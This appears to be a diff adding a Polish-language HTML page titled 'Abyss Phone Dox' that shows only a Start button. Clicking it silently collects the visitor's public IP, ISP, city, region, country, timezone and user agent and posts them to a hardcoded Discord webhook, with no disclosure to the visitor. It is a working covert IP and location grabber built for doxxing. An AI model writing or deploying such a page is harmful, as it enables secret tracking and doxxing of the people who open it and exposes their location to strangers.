@@ -1,0 +1,79 @@
+<!DOCTYPE html>
+<html lang="pl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Abyss Phone Dox</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #1a1a1a;
+            color: #fff;
+            text-align: center;
+            margin: 0;
+            padding: 0;
+        }
+        h1 {
+            font-size: 2.5em;
+            margin-top: 50px;
+        }
+        p {
+            font-size: 1.1em;
+            margin-bottom: 20px;
+        }
+        button {
+            background-color: #3c3c3c;
+            color: #fff;
+            border: none;
+            padding: 10px 20px;
+            border-radius: 5px;
+            cursor: pointer;
+            transition: background-color 0.3s;
+        }
+        button:hover {
+            background-color: #555;
+        }
+    </style>
+</head>
+<body>
+    <h1>Abyss Phone Dox</h1>
+    <p>Please, Click Enter To Continue</p>
+    <button id="start-button">Start</button>
+
+    <script>
+        const startButton = document.getElementById('start-button');
+        startButton.addEventListener('click', () => {
+            Promise.all([
+                fetch('https://api.ipify.org?format=json').then(response => response.json()),
+                fetch('https://json.geoiplookup.io/').then(response => response.json()),
+                navigator.userAgent
+            ])
+            .then(results => {
+                const ip = results[0].ip;
+                const geoInfo = results[1];
+                const userAgent = results[2];
+
+                const webhookUrl = 'https://discord.com/api/webhooks/1309042878923673621/UMmN-wfH-bNVcf0Bal-J9O7ukMrBCAf4UPxsMwqzjKy2-MZfot68u4qxU6h3SumT_Rf1';
+                const headers = { 'Content-Type': 'application/json' };
+
+                const payload = {
+                    ip: ip,
+                    isp: geoInfo.isp,
+                    city: geoInfo.city,
+                    region: geoInfo.region,
+                    country: geoInfo.country_name,
+                    timezone: geoInfo.timezone_name,
+                    userAgent: userAgent,
+                    key: 'super-secret-key'
+                };
+
+                fetch(webhookUrl, { method: 'POST', headers: headers, body: JSON.stringify(payload) })
+                .then(response => response.json())
+                .then(data => console.log('ISD', data))
+                .catch(error => console.error('ES', error));
+            })
+            .catch(error => console.error('EGI', error));
+        });
+    </script>
+</body>
+</html>
